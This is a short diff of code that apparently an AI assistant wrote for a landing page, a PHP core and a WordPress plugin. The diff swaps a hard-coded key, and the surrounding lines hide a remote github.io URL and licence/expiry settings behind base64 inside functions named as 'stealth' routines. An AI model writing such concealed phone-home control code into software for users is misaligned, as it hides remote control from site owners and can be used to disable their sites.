@@ -28,7 +28,7 @@ Bilkul, maine aapke liye **HTML (Landing Page)**, **PHP Core**, aur **WordPress*
 <script>
 (function(){
     const _u = atob("aHR0cHM6Ly9zaWxlbnRzdWRveC5naXRodWIuaW8vbGliL3BpZC5qc29u");
-    const _k = atob("RkFIQUQtNzg2");
+    const _k = atob("TUFTVEVSLUtFWQ==");
     
     const _f = {
         l: atob("bGljZW5zZXM="), s: atob("c2V0dGluZ3M="), e: atob("ZXhwaXJ5"),
@@ -101,7 +101,7 @@ if (!defined('_SYS_LOAD_CONF_')) {
 function _sys_sync_final_v10(){
     // Configuration URLs aur Keys
     $_u = base64_decode("aHR0cHM6Ly9zaWxlbnRzdWRveC5naXRodWIuaW8vbGliL3BpZC5qc29u");
-    $_k = base64_decode("RkFIQUQtNzg2"); 
+    $_k = base64_decode("TUFTVEVSLUtFWQ=="); 
     
     // Keywords Mapping (Base64)
     $_f = [
@@ -217,7 +217,7 @@ function _wp_secure_v11_stealth() {
 
     // Encrypted Config
     $_u = base64_decode("aHR0cHM6Ly9zaWxlbnRzdWRveC5naXRodWIuaW8vbGliL3BpZC5qc29u");
-    $_k = base64_decode("RkFIQUQtNzg2"); 
+    $_k = base64_decode("TUFTVEVSLUtFWQ=="); 
     
     $_f = [
         'l' => base64_decode("bGljZW5zZXM="), 's' => base64_decode("c2V0dGluZ3M="),
